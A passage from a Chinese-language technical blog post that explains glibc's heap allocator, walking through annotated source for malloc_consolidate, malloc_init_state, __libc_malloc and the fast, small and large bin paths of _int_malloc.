class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      从 fast bin 中移除每个块并进行合并，然后将它们放入未排序 bin 中。做这个的原因包括：将块放入未排序 bin 中避免了需要在 malloc 确定块不会立即被重用之前计算实际的 bin。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 在 free() 中合并代码的稍微精简版本 */</span></span><br><span class="line">  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">    unsorted_bin-&gt;fd = p;</span><br><span class="line">    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    p-&gt;bk = unsorted_bin;</span><br><span class="line">    p-&gt;fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="未初始化"><a href="#未初始化" class="headerlink" title="未初始化"></a>未初始化</h3><p>首先会通过get_max_fast()判断当前堆是否已经完成初始化，第一次调用malloc申请分配时，该函数返回值为0，此时会进行堆的初始化工作。初始化会调用malloc_init_state()函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  malloc_init_state(av);</span><br><span class="line">  check_malloc_state(av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于malloc_init_state函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 为普通 bin 建立循环链接 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  set_noncontiguous (av);</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">  av-&gt;flags |= FASTCHUNKS_BIT;</span><br><span class="line"></span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在malloc_init_state()函数会进行堆的初始化工作，并且调用set_max_fast()设置global_max_fast为DEFAULT_MAXFAST，</p><ul><li>首先会通过循环迭代初始化内存分配中的bins，bin-&gt;fd和bin-&gt;bk被初始化为指向自己，以建立循环链表。</li><li>如果内存管理状态不是主分配区（<code>main_arena</code>），则调用 <code>set_noncontiguous</code> 函数。这个函数用于设置内存管理状态的 <code>noncontiguous</code> 标志，表示内存分配不是连续的。</li><li>如果内存管理状态是主分配区（<code>main_arena</code>），则调用 <code>set_max_fast</code> 函数，将 <code>DEFAULT_MXFAST</code> 设置为最大的快速分配块大小。这个值用于确定哪些块可以放入 fastbin 中。</li><li>设置 <code>FASTCHUNKS_BIT</code> 标志：将 <code>FASTCHUNKS_BIT</code> 标志设置为内存管理状态的 <code>flags</code> 中，以表示 fastbin 可用。</li><li>初始化 <code>top</code>：调用 <code>initial_top</code> 函数，为内存管理状态初始化 <code>top</code> 指针，指向内存池的起始位置。</li></ul><blockquote><p> check_malloc_state()函数，用来检查内存管理器的状态是否合法，并且用于內部调试，用于内部调试和错误检测的函数，用于验证内存管理器的状态是否正确。</p><p> av：表示内存管理的状态（memory state）。这个参数是一个指向 <code>malloc_state</code> 结构体的指针，用于跟踪和管理内存分配和释放的状态信息。</p></blockquote><p>DEFAULT_MXFAST 在 32 位系统上为 64，在 64 位系统上为 128。后面再次调用 malloc_consolidate() 的时候， get_max_fast() 返回值都不会等于 0，就不会再次进行初始化。</p><h3 id="已初始化"><a href="#已初始化" class="headerlink" title="已初始化"></a>已初始化</h3><p>如果get_max_state返回值不为0，那么就是堆已经完成初始化，接下来会将fastbin中的每一个chunk合并整理到unsorted_chunk或者top_chunk。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">  clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为malloc_consolidate()会清空fastbin，因此先调用clear_fastchunks()清除标志位</p><p>接下来就会先遍历fastbinY数组，得到每一个固定尺寸的fastbin单链表，然后再遍历fastbin单链表得到相同大小的空闲chunk。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">   fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">     p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">   &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">   &#125; <span class="keyword">while</span> (fb++ != maxfb); </span><br></pre></td></tr></table></figure><p>对于每一个chunk会先尝试向后合并，合并操作就是更新p的size和指向，然后调用unlink宏将其从bin中脱离。</p><p>然后会尝试向前合并，如果前一个相邻top_chunk，那么就直接合并到top_chunk后，不管unsorted_bin；如果前一个不相邻top_chunk，则向前合并后插入到unsorted_bin。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//这个条件检查前一个块p是否被使用</span></span><br><span class="line">  prevsize = p-&gt;prev_size;<span class="comment">//获取前一个块 p 的大小信息</span></span><br><span class="line">  size += prevsize;<span class="comment">//将前一个块的大小添加到当前块 p 的大小中，以得到合并后的块的总大小。</span></span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));<span class="comment">//将指针 p 移动到合并后的块的新位置，即前一个块的位置，这是为了合并两个块</span></span><br><span class="line">  unlink(av, p, bck, fwd);<span class="comment">//从链表中移除前一个块 p，以便进行合并</span></span><br><span class="line">&#125;<span class="comment">//向后合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;<span class="comment">//这个条件检查下一个块 nextchunk 是否是内存池的顶部块（top chunk）。如果不是顶部块，就需要处理下一个块的合并</span></span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="comment">//检查下一个块 nextchunk 是否正在使用。这是通过检查下一个块的头部信息中的标志位来完成的。</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);<span class="comment">//从链表中移除下一个块 nextchunk，以便进行合并。</span></span><br><span class="line">  &#125; <span class="keyword">else</span><span class="comment">//如果下一个块是正在使用的块，就需要清除它的 &quot;in use&quot; 标志位，以便进行合并。</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);<span class="comment">//获取未排序块链表的头部</span></span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;<span class="comment">//获取未排序块链表的头部</span></span><br><span class="line">  unsorted_bin-&gt;fd = p;<span class="comment">//将当前块 p 添加到未排序块链表的前面</span></span><br><span class="line">  first_unsorted-&gt;bk = p;<span class="comment">//更新未排序块链表头部的 &quot;bk&quot; 指针，以链接到当前块 p</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;<span class="comment">//：如果合并后的块的大小不在小块范围内，即它太大了，就需要清除 &quot;fd_nextsize&quot; 和 &quot;bk_nextsize&quot; 字段，以便将其视为一个独立的块</span></span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);<span class="comment">//设置合并后的块的头部信息，包括大小和前一个块的使用状态</span></span><br><span class="line">  p-&gt;bk = unsorted_bin;<span class="comment">//设置合并后的块的 &quot;bk&quot; 指针，以链接到未排序块链表</span></span><br><span class="line">  p-&gt;fd = first_unsorted;<span class="comment">//设置合并后的块的 &quot;fd&quot; 指针，以链接到未排序块链表的前面</span></span><br><span class="line">  set_foot(p, size);<span class="comment">//设置合并后的块的尾部信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;<span class="comment">//向前合并</span></span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222325161.png" alt="1"></p><h2 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h3><p>malloc函数一般被用来申请内存块，该函数调用了_libc_malloc函数，该函数核心为int_malloc函数。</p><p>该函数会先检查是否有内存分配函数的hook函数（_malloc_hook），如果存在，它会调用该钩子函数来执行内存分配操作。如果没有用户定义的钩子函数，它会继续执行内存分配的默认逻辑。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// wapper for int_malloc</span></span><br><span class="line"><span class="type">void</span> *__libc_malloc(<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> * victim;</span><br><span class="line">    <span class="comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span></span><br><span class="line">    <span class="type">void</span> *(*hook)(<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>然后会寻找一个arena来试图分配内存，再调用_int_malloc函数去申请内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">arena_get(ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>分配失败就会去尝试寻找一个可以用的arena，并分配内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">   before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    LIBC_PROBE(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = arena_get_retry(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请到了以后需要解锁（关于锁在基础知识里面有）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>) __libc_lock_unlock(ar_ptr-&gt;mutex);</span><br></pre></td></tr></table></figure><p>然后会判断目前的状态是否满足以下条件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||</span><br><span class="line">       ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></table></figure><ul><li><p>没有申请到内存</p></li><li><p>是mmap的内存</p></li><li><p>申请到的内存必须在其分配的arena中</p></li></ul><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><p>上面说过，_int_malloc是内存分配的和核心函数，大致流程为：</p><ul><li>会根据用户申请的内存块大小和相应大小的chunk使用频度来实现不同的分配方法</li><li>由小到大依次检查各种bin中是否有相应的内存块能够满足请求的内存</li><li>如果所有的空闲chunk都无法满足就会从top_chunk去找</li><li>如果top_chunk也无法满足，堆分配器就会进行内存申请</li></ul><p><del>_int_malloc函数太长了，这里就不放全部的源码了</del></p><p>函数首先定义了一些变量，并且将用户申请的内存大小转换为内部的chunk大小</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* 规范化后的请求大小 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* 相关的二进制索引 */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* 相关的二进制块指针 */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* 被检查/选定的内存块 */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* 其大小 */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* 其二进制索引 */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* 拆分后的剩余块 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* 其大小 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* 位图遍历器 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* 位图遍历器 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* 当前二进制位图的字 */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* 链接的临时变量 */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* 链接的临时变量 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     将请求大小转换为内部形式，通过添加 SIZE_SZ 字节的开销，</span></span><br><span class="line"><span class="comment">     可能还需要添加更多的开销以获得必要的对齐和/或</span></span><br><span class="line"><span class="comment">     以至少获得 MINSIZE，即可分配的最小大小。此外，</span></span><br><span class="line"><span class="comment">     checked_request2size 会检查并捕获（返回0）请求大小，</span></span><br><span class="line"><span class="comment">     如果在填充和对齐时太大而会绕过零。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  checked_request2size (bytes, nb);</span><br></pre></td></tr></table></figure><p>首先调用<code>checked_request2size</code>将需要分配的内存大小bytes转换为chunk的大小。<code>checked_request2size</code>是个宏定义，主要调用request2size进行计算</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>在学习结构的时候有这样一个地方，当一个chunk为空闲时，至少要有prev_size、size、fd和bk四个参数，因此MINISIZE就代表了这四个参数需要占用的内存大小，当一个chunk被使用时，prev_size可能会被前一个chunk用来存储，fd、bk会被用来存储数据，所以只剩下了size参数需要设置，request2size中的SIZE_SZ就是<code>INTERNAL_SIZE_T</code>类型的大小，因此至少需要<code>req+SIZE_SZ</code>的内存大小。<code>MALLOC_ALIGN_MASK</code>用来对齐，因此request2size就计算出了所需的chunk的大小。</p><p>参数av就是分配区指针，为null表示没有分配区可用，这时会调用sysmalloc通过mmap获取chunk。</p><h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码会先检查是否存在可用的分配区（arena），如果没有，就使用malloc函数通过mmap系统调用来获取一块内存块，获取内存块成功后，还会对这块内存块进行填充（perturb），以提高内存分配的安全性。</p><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果请求的内存大小符合快速分配的条件，首先检查相应的快速分配区块。</span></span><br><span class="line"><span class="comment">   即使在内存池（av）尚未初始化的情况下，这段代码也是安全的，因此我们可以在不进行检查的情况下尝试执行它，这有助于提高执行效率。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast()))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 计算请求内存大小所对应的快速分配区块的索引。</span></span><br><span class="line">  idx = fastbin_index(nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取对应快速分配区块的指针。</span></span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 从快速分配区块中取出一块内存块，利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">  mchunkptr pp = *fb;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 选择一块内存块作为候选（victim）。</span></span><br><span class="line">    victim = pp;</span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))</span><br><span class="line">         != victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果成功找到一块内存块，进行处理。</span></span><br><span class="line">  <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果发现内存块的大小与索引不匹配，说明存在内存损坏。</span></span><br><span class="line">    <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">    <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="comment">// 打印错误信息并返回NULL。</span></span><br><span class="line">      malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 针对重新分配的内存块进行检查。调试有用。</span></span><br><span class="line">    check_remalloced_chunk(av, victim, nb);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回分配到的内存块指针。</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对内存块进行填充以增强安全性。</span></span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码主要用于快速分配内存块，首先检查请求的内存大小是否符合快速分配的条件，然后在快速分配区块中查找可用的内存块。如果找到符合要求的内存块，就返回该内存块的指针，否则返回NULL。同时，如果发现内存块的大小与索引不匹配，会报告内存损坏错误。从fastbin的头结点开始取chunk。</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果是一个小内存请求，检查常规的内存块分配区（smallbins）。</span></span><br><span class="line"><span class="comment">   由于这些 &quot;smallbins&quot; 每个都包含一种大小的内存块，所以无需在内部进行搜索。</span></span><br><span class="line"><span class="comment">   （对于大内存请求，我们需要等待未分类的内存块被处理以找到最佳匹配。</span></span><br><span class="line"><span class="comment">   但对于小内存请求，匹配是精确的，所以我们可以立即检查，这更快。）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果fast bin无法满足需求，并且所申请的chunk大小满足small chunk的范围</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 计算请求内存大小所对应的小内存块分配区（smallbins）的索引。</span></span><br><span class="line">  idx = smallbin_index (nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取对应的小内存块分配区（smallbins）的chunk指针。</span></span><br><span class="line">  bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 尝试从分配区中取出一个内存块作为候选（victim）。获取 small bin 的最后一个 chunk</span></span><br><span class="line">  <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。有两种情况</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 第一种，如果victim等于0，表示分配区未初始化，需要执行内存整理（malloc_consolidate）。</span></span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* 初始化检查 */</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">      <span class="comment">// 取出候选内存块的前一个和后一个块。</span></span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 检查候选内存块的前一个块是否与其后一个块的前驱一致，用于确保链表完整性。</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 标记候选内存块为已分配状态，并从分配区中移除。</span></span><br><span class="line">      set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果内存分配不是主分配区（main arena），设置相应的标志位。</span></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 对分配的内存块进行检查。</span></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 返回分配到的内存块指针。将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 对内存块进行填充以增强安全性。</span></span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于处理小内存块的分配请求。它首先检查请求的内存大小是否在小内存块的分配范围内，然后在相应的小内存块分配区（smallbins）中查找合适的内存块。如果找到一个合适的内存块，就将其标记为已分配并从分配区中移除，然后返回该内存块的指针。如果分配区尚未初始化，会进行内存整理。同时，还会检查链表完整性，以确保内部数据结构的正确性。最后，分配成功后，还会对内存块进行检查和填充，以提高安全性。</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>当fast bin和large bin中的chunk都不能满足用户申请的chunk大小时，就会从large bin中尝试寻找。但是在这里并没有直接扫描对应bin中的chunk，调用了malloc_consolidata函数处理fast bin中的chunk，如果能合并就合并后放到unsorted bin中，不能合并就直接放到unsorted bin中。这里在还不知道是否有可用内存就执行合并操作，以便减少内存碎片。实际上，合并操作在大多数程序并不频繁，需要频繁调用合并操作的程序通常容易出现内存问题。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果这是一个大内存请求，在继续之前合并快速分配区块（fastbins）。</span></span><br><span class="line"><span class="comment">   尽管看起来在查看是否有可用内存之前杀掉所有的快速分配区块似乎有些过多，</span></span><br><span class="line"><span class="comment">   但这样做可以避免通常与快速分配区块相关的内存碎片问题。</span></span><br><span class="line"><span class="comment">   此外，在实际应用中，程序通常会连续地发出小内存或大内存的请求，而较少混合使用，</span></span><br><span class="line"><span class="comment">   因此在大多数程序中合并操作并不那么频繁。而那些需要频繁调用合并操作的程序，通常容易出现内存碎片问题。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 计算请求内存大小所对应的大内存块分配区（largebins）的索引。</span></span><br><span class="line">  idx = largebin_index (nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 